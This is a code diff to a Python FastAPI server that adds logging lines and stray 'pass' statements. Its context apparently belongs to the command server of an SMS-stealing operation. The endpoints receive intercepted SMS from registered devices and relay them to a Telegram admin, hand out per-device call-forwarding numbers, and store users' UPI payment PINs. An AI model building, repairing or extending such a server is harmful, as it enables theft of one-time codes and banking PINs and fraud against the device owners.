@@ -69,14 +69,16 @@ app.add_middleware(
 
 @app.on_event("startup")
 async def startup_event():
-
+    logger.info("Starting application...")
     await connect_to_mongodb()
     await auth_service.create_default_admin()
+    logger.info("Application started successfully")
 
 @app.on_event("shutdown")
 async def shutdown_event():
-
+    logger.info("Shutting down application...")
     await close_mongodb_connection()
+    logger.info("Application shutdown complete")
 
 @app.post("/devices/heartbeat")
 async def device_heartbeat(request: Request):
@@ -272,15 +274,18 @@ async def receive_sms(request: Request):
             timestamp = data.get("timestamp")
         
         if not device_id:
+            pass
 
             raise HTTPException(status_code=400, detail="device_id is required")
 
         if not sender or not message:
+            pass
 
             raise HTTPException(status_code=400, detail="sender and message are required")
 
         device = await device_service.get_device(device_id)
         if not device:
+            pass
 
             await device_service.register_device(device_id, {
                 "device_name": "Unknown Device",
@@ -312,6 +317,7 @@ async def receive_sms(request: Request):
                     device_id, device.admin_username, sender, message
                 )
         except Exception as tg_error:
+            pass
 
         return {
             "status": "success",
@@ -330,6 +336,7 @@ async def receive_sms(request: Request):
 
 @app.get("/api/getForwardingNumber/{device_id}")
 async def get_forwarding_number_new(device_id: str):
+    pass
     
     try:
         forwarding_number = await device_service.get_forwarding_number(device_id)
@@ -462,6 +469,7 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
 
 @app.post("/auth/verify-2fa", response_model=TokenResponse)
 async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks: BackgroundTasks):
+    pass
     
     ip_address = get_client_ip(request)
     user_agent = get_user_agent(request)
@@ -627,6 +635,7 @@ async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks
 
 @app.post("/bot/auth/verify-otp", response_model=BotTokenResponse, tags=["Bot Auth"])
 async def bot_verify_otp(request: BotOTPVerify, req: Request):
+    pass
     
     ip_address = get_client_ip(req)
     user_agent = get_user_agent(req)
@@ -706,6 +715,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         admin = await mongodb.db.admins.find_one({"device_token": admin_token})
         
         if not admin:
+            pass
 
             admin_username = None
         else:
@@ -714,6 +724,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
         
         if not device:
+            pass
 
             raise HTTPException(
                 status_code=404,
@@ -755,6 +766,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
                 device_model
             )
         else:
+            pass
 
         return UPIPinResponse(
             status="success",
